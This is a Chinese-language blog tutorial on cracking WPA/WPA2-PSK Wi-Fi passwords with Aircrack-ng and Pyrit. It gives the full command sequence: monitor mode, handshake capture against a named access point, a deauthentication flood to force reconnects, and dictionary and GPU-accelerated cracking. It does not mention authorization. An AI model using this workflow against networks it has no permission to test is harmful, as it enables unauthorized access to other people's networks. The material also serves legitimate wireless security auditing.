---
layout: post
title: Aircrack NG 套件使用详解
description: 学习如何使用Aircrack-ng 套件和pyrit程序。
keywords: GitHub,jekyll
---

## 软件介绍
### Aircrack-ng概述
Aircrack-ng是一款用于破解无线802.11WEP及WPA-PSK加密的工具,该工具在2005年11月之前名字是Aircrack,在其2.41版本之后才改名
为Aircrack-ng。
Aircrack-ng(注意大小写,aircrack-ng是Aircrackng中的一个组件)是一个包含了多款工具的无线攻击审计套装,这里面很多工具在后面的
内容中都会用到,具体见下表为Aircrack-ng包含的组件具体列表。

- aircrack-ng
	主要用于WEP及WPA-PSK密码的恢复,只要airodump-ng收集到足够数量的数据包,aircrack-ng就可以自动检测数据包并判断是否可以破解
- airmon-ng
   用于改变无线网卡工作模式,以便其他工具的顺利使用
- airodump-ng
    用于捕获802.11数据报文,以便于aircrack-ng破解
- aireplay-ng
	 在进行WEP及WPA-PSK密码恢复时,可以根据需要创建特殊的无线网络数据报文及流量,不断的惊醒注入和重放，提高获得握手包的概率。

- airserv-ng 主要在Window平台使用，因为Window没有办法直接调用网卡接口，可以将无线网卡连接至某一特定socket端口,然后其他程序通过socket来控制这个网卡。

- airolib-ng进行WPA Rainbow Table攻击时使用,用于建立特定数据库文件用于解开处于加密状态的数据包
airdecap-ng tools 其他用于辅助的工具,如airdriver-ng、packetforge-ng等

## 具体步骤

### 一、让网卡进入监听模式


```
iwconfig

输出：
wlp4s0    IEEE 802.11  ESSID:"***"
          Mode:Managed  Frequency:2.412 GHz  Access Point: DF:1F:0F:1F:5E:D2
          Bit Rate=150 Mb/s   Tx-Power=20 dBm
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:on
          Link Quality=62/70  Signal level=-48 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:22   Missed beacon:0
可以看到当前网卡是处于管理模式。

/* 命令的具体用法可以man一下*/

/* 检查当前系统是否适合进入监听模式*/

sudo airmon-ng check
输出：
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
1236	NetworkManager
1242	avahi-daemon
1251	avahi-daemon
1638	wpa_supplicant
30190	dhclient
Process with PID 30190 (dhclient) is running on interface wlp4s0

Interface	Chipset		Driver
wlp4s0		Unknown 	rtl8723be - [phy0]

说明有应用程序可能会影响网卡进入监听模式的正常工作。
那么可以手动将这些程序kill掉或者使用airmon工具：

sudo airmon-ng check kill

输出：
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
1236	NetworkManager
1242	avahi-daemon
1251	avahi-daemon
1638	wpa_supplicant
30190	dhclient
Process with PID 30190 (dhclient) is running on interface wlp4s0
Killing all those processes...


/* 进入监听模式*/
sudo airmon-ng start wlp4s0


Interface	Chipset		Driver

wlp4s0		Unknown 	rtl8723be - [phy0]
				(monitor mode enabled on mon0)


/* 查看是否进入监听模式*/
➜  ~ iwconfig
wlp4s0    IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:on

enp0s25   no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:on

lo        no wireless extensions.

多了一个网卡，这可以看成是一张虚拟的网卡，说明已经进入监听模式。

```

测试发现，如果没有使用sudo airmon-ng check kill,好像效果更好，但是需要将自己连接的wifi 热点给断开，
没有理解为什么。

### 二、收集802.11的数据帧
这个步骤就是主要是用于收集终端设备和AP之间的握手包，为后面的寻找密码作准备。
使用的命令是 airodump-ng, 具体参数可以可以man airodump-ng.

```
sudo airodump-ng --bssid D8:1A:0D:1A:5A:D2 -c 1 --write WPAcrack mon0

--bssid 这个参数就是用于指定具体的AP，--write 就是将搜集的数据存放到指定的文件中。
-i, --ivs:使用该选项后,只会保存可用于破解的IVS数据报文。通过设置过滤,不再将所有无线数据保存,包大小。

输出：
CH  9 ][ Elapsed: 11 mins ][ 2018-07-01 22:12 ][ WPA handshake: DF:1F:0F:1F:5E

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 DF:1F:0F:1F:5E:D2  -45     1656       53    0   1  54e. WPA2 CCMP   PSK  zHOUS

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
                                                                               _

如果屏幕上出现 WPA handshake: ×××××× ， 那么就说明已经搜集到握手包，建议多收集几个，这样可以提高命中的概率。

```


### 三、 提高搜集WPA handshake 速度
不断模拟连接上终端设备给路由器发送一些攻击数据包，如：解除认证攻击（-0）、伪造认证攻击（-1）、交互式数据包重放攻击（-2）、手动ARP请求注入攻击（-3）、ARP请求重放注入攻击（-4）。

```

–deauth count：解除一个或所有工作站与接入点之间的认证（-0）
-fakeauth delay：向接入点发起伪造的认证（-1）
-interactive：交互式注入攻击（-2）
-arpreplay：标准ARP请求包重放（-3）
chopchop：解密WEP包
-fragment：碎片包攻击模式
-test：注入测试
```
关于这个命令的具体用法可以通过man手册查询，或者参考[Aircrack-ng之Aireplay-ng命令](https://blog.csdn.net/qq_28208251/article/details/48115815)

```
sudo aireplay-ng --deauth 1000 -a DF:1F:0F:1F:5E:D2 mon0
```

### 四、分析WPA handshake，得到想要的内容

- 方法一 aircrack-ng
```
aircrack-ng WPAcrack_sll-01.cap -w 密码字典.txt
```

- 方法二 pyrit

这个工具可以使用GPU进行并行运算,安装配置都不算复杂
项目的主页[JPaulMora/Pyrit](https://github.com/JPaulMora/Pyrit)

#### 安装
[Pyrit/wiki/ReferenceManual](https://github.com/JPaulMora/Pyrit/wiki/ReferenceManual)

```
### Ubuntu 16.04

git clone https://github.com/JPaulMora/Pyrit.git
sudo pip install psycopg2
sudo pip install scapy
sudo apt-get install python-scapy
cd Pyrit                 ## Compile time!
python setup.py clean
python setup.py build
sudo python setup.py install
```

#### 配置GPU并行加速
- 安装显卡驱动 [ubuntu 16.04 amd显卡安装](https://blog.csdn.net/aniuge008/article/details/79099072)

```
1.下载amd显卡驱动amd-pro-install

http://support.amd.com/en-us/kb-articles/Pages/AMDGPU-PRO-Driver-for-Linux-Release-Notes.aspx

 2.安装驱动

 ./amdgpu-pro-install –y --opencl=legacy
```

- 配置pyrit config
```
编辑 ~/.pyrit/config
use_CUDA = false // N 卡
use_OpenCL = true // ATI 显卡
```

- 安装opencl的计算模块：

```

cd /modules/cpyrit_opencl/
python setup.py build
sudo python setup.py install
pyrit list_cores
```

过程中可能出现依赖库OpenGl的缺失，可以创建软链接到系统默认库路径下。OpenGl 库是AMDGPU的驱动中已经包含了。

#### 使用

- 检查收集的数据包中是否有用的WPA handshake

```
pyrit -r pcap/WPAcrack_sll-01.cap analyze
```

- 将某个ap的握手数据分离出来：

```
pyrit -r pcap/WPAcrack_sll-01.cap  -b d8:1*:0*:1*:5*:d* -o test.cap strip
```

- 直接通过字典文件进行解密,如果中断则会重新来过。。。

```
pyrit -r test.cap  -i passwd.tar attack_passthrough
```

- 利用attack_db 机制来进行解密尝试

1. 将密码字典导入到本地目录中,可以通过配置 ~/.pyrit/config 中的file选项来配置存放目录：

```
pyrit -i passwd.tar import_passwords
pyrit eval  # 查看结果
```
2. 和SSID配合，生成对应的密钥对, 注意这一步运算量非常的大，可以中断，不会重新来过。

```
pyrit -e hello——ssid create_essid

pyrit eval  # 查看结果
```

3. 利用生成的字典库，进行匹配

```
pyrit -r test.cap --all-handshakes attack_db
```

[无线破解Aircrack-ng套件详解－－airmon-ng与airodump-ng](https://blog.csdn.net/QS_0928/article/details/77387335)

[Cracking WPA2-PSK Passwords Using Aircrack-Ng](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/)

[Pyrit 项目主页](https://github.com/JPaulMora/Pyrit/wiki）
